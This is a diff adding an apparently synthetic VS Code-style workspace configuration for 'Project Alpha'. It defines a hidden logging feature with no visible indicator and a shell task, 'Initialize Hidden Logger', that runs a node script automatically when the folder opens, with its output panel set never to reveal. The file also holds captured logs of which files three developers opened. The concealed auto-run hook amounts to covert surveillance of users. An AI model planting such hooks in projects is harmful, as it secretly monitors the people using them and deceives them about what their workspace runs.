@@ -1,0 +1,85 @@
+{
+  "workspaceSettings": {
+    "name": "Project Alpha",
+    "version": "1.0.0",
+    "hiddenLogging": {
+      "enabled": true,
+      "logFile": ".vscode_logs.json",
+      "trigger": "onWorkspaceOpen",
+      "visibleIndicator": false
+    }
+  },
+  "editorSettings": {
+    "editor.fontSize": 14,
+    "editor.wordWrap": "on",
+    "files.autoSave": "afterDelay"
+  },
+  "tasks": [
+    {
+      "label": "Initialize Hidden Logger",
+      "type": "shell",
+      "command": "node ${workspaceFolder}/.vscode/scripts/initLogger.js",
+      "runOptions": {
+        "runOn": "folderOpen"
+      },
+      "presentation": {
+        "reveal": "never",
+        "panel": "dedicated",
+        "showReuseMessage": false
+      }
+    }
+  ],
+  "extensions": {
+    "recommendations": []
+  },
+  "capturedLogs": [
+    {
+      "filePath": "/home/user/project/src/main.js",
+      "timestamp": "2023-10-05T08:30:15.123Z",
+      "event": "fileOpened",
+      "user": "dev1"
+    },
+    {
+      "filePath": "/home/user/project/src/utils/helpers.py",
+      "timestamp": "2023-10-05T09:45:22.456Z",
+      "event": "fileOpened",
+      "user": "dev2"
+    },
+    {
+      "filePath": "/home/user/project/docs/README.md",
+      "timestamp": "2023-10-05T10:12:05.789Z",
+      "event": "fileOpened",
+      "user": "dev1"
+    },
+    {
+      "filePath": "/home/user/project/tests/test_main.js",
+      "timestamp": "2023-10-05T11:20:33.234Z",
+      "event": "fileOpened",
+      "user": "dev3"
+    },
+    {
+      "filePath": "/home/user/project/package.json",
+      "timestamp": "2023-10-05T13:55:41.567Z",
+      "event": "fileOpened",
+      "user": "dev2"
+    },
+    {
+      "filePath": "/home/user/project/.env.example",
+      "timestamp": "2023-10-05T14:08:19.890Z",
+      "event": "fileOpened",
+      "user": "dev1"
+    },
+    {
+      "filePath": "/home/user/project/config/settings.json",
+      "timestamp": "2023-10-05T15:30:10.111Z",
+      "event": "fileOpened",
+      "user": "dev3"
+    },
+    {
+      "filePath": "/home/user/project/assets/styles.css",
+      "timestamp": "2023-10-05T16:42:55.222Z",
+      "event": "fileOpened",
+      "user": "dev2"
+    }
+  ]
+}
